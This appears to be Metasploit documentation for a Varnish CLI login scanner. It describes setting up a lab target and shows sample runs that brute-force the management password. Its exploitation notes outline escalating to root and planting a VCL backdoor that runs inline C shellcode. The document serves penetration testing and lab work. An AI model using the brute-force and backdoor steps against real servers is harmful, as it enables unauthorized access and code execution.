## Vulnerable Application

  Ubuntu 14.04 can `apt-get install varnish`.  At the time of writing that installed varnish-3.0.5 revision 1a89b1f.
  Kali installed varnish-5.0.0 revision 99d036f

  Varnish installed and ran the cli on localhost.  First lets kill the service: `sudo service varnish stop`.  Now, there are two configurations we want to test:

  1. No Authentication: `varnishd -T 0.0.0.0:6082`. Varnish 4 and later require either passing '-S ""', or may not support unauthenticated mode at all.
  2. Authentication (based on shared secret file): `varnishd -T 0.0.0.0:6082 -S file`.
    1. I made an easy test one `echo "secret" > ~/secret`

## Exploitation Notes

These notes were taken from the original module in EDB, and can be used when developing a working remote exploit

```
- varnishd typically runs as root, forked as unpriv.
- 'param.show' lists configurable options.
- 'cli_timeout' is 60 seconds. param.set cli_timeout 99999 (?) if we want to inject payload into a client thread and avoid being killed.
- 'user' is nobody. param.set user root (may have to stop/start the child to activate)
- 'group' is nogroup. param.set group root (may have to stop/start the child to activate)
- (unless varnishd is launched with -r user,group (read-only) implemented in v4, which may make priv esc fail).
- vcc_unsafe_path is on. used to 'import ../../../../file' etc.
- vcc_allow_inline_c is off. param.set vcc_allow_inline_c on to enable code execution.
- code execution notes:

* quotes must be escaped \"
* \n is a newline
* C{ }C denotes raw C code.
* e.g. C{ unsigned char shellcode[] = \"\xcc\"; }C
* #import <stdio.h> etc must be "newline", i.e. C{ \n#include <stdlib.h>\n dosomething(); }C (without 2x \n, include statement will not interpret correctly).
* C{ asm(\"int3\"); }C can be used for inline assembly / shellcode.
* varnishd has it's own 'vcl' syntax. can't seem to inject C randomly - must fit VCL logic.
* example trigger for backdoor:

VCL server:
  vcl.inline foo "vcl 4.0;\nbackend b { . host = \"127.0.0.1\";  } sub vcl_recv { if (req.url ~ \"^/backd00r\") { C{ asm(\"int3\"); }C } } \n"
  vcl.use foo
  start

Attacker:
  telnet target 80
  GET /backd00r HTTP/1.1
  Host: 127.0.0.1

(... wait for child to execute debug trap INT3 / shellcode).

CLI protocol notes from website:

The CLI protocol used on the management/telnet interface is a strict request/response protocol, there are no unsolicited transmissions from the responding end.

Requests are whitespace separated tokens terminated by a newline (NL) character.

Tokens can be quoted with "..." and common backslash escape forms are accepted: (\n), (\r), (\t), (
), (\"), (\%03o) and (\x%02x)

The response consists of a header which can be read as fixed format or ASCII text:

    1-3      %03d      Response code
    4        ' '       Space
    5-12     %8d       Length of body
    13       \n        NL character.
Followed by the number of bytes announced by the header.

The Responsecode is numeric shorthand for the nature of the reaction, with the following values currently defined in include/cli.h:

enum cli_status_e {
        CLIS_SYNTAX     = 100,
        CLIS_UNKNOWN    = 101,
        CLIS_UNIMPL     = 102,
        CLIS_TOOFEW     = 104,
        CLIS_TOOMANY    = 105,
        CLIS_PARAM      = 106,
        CLIS_OK         = 200,
        CLIS_CANT       = 300,
        CLIS_COMMS      = 400,
        CLIS_CLOSE      = 500
};
```

## Verification Steps

  Example steps in this format:

  1. Install the application
  2. Start msfconsole
  3. Do: ```use auxiliary/scanner/varnish/varnish_cli_login```
  4. Do: ```run```
  5. Find a valid login.

## Options

  **PASS_FILE**

  File which contains the password list to use.

## Scenarios

  Running against Ubuntu 14.04 with varnish-3.0.5 revision 1a89b1f and NO AUTHENTICATION

  ```
    resource (varnish.rc)> use auxiliary/scanner/varnish/varnish_cli_login
    resource (varnish.rc)> set pass_file /root/varnish.list
    pass_file => /root/varnish.list
    resource (varnish.rc)> set rhosts 192.168.2.85
    rhosts => 192.168.2.85
    resource (varnish.rc)> set verbose true
    verbose => true
    resource (varnish.rc)> run
    [+] 192.168.2.85:6082     - 192.168.2.85:6082 - LOGIN SUCCESSFUL: No Authentication Required
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    msf auxiliary(varnish_cli_login) >
    ```

  Running against Ubuntu 14.04 with varnish-3.0.5 revision 1a89b1f

  ```
    resource (varnish.rc)> use auxiliary/scanner/varnish/varnish_cli_login
    resource (varnish.rc)> set pass_file /root/varnish.list
    pass_file => /root/varnish.list
    resource (varnish.rc)> set rhosts 192.168.2.85
    rhosts => 192.168.2.85
    resource (varnish.rc)> set verbose true
    verbose => true
    resource (varnish.rc)> run
    [*] 192.168.2.85:6082     - 192.168.2.85:6082 - Authentication Required
    [!] 192.168.2.85:6082     - No active DB -- Credential data will not be saved!
    [*] 192.168.2.85:6082     - 192.168.2.85:6082 - LOGIN FAILED: bad
    [*] 192.168.2.85:6082     - 192.168.2.85:6082 - LOGIN FAILED: good
    [+] 192.168.2.85:6082     - 192.168.2.85:6082 - LOGIN SUCCESSFUL: secret
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
  ```
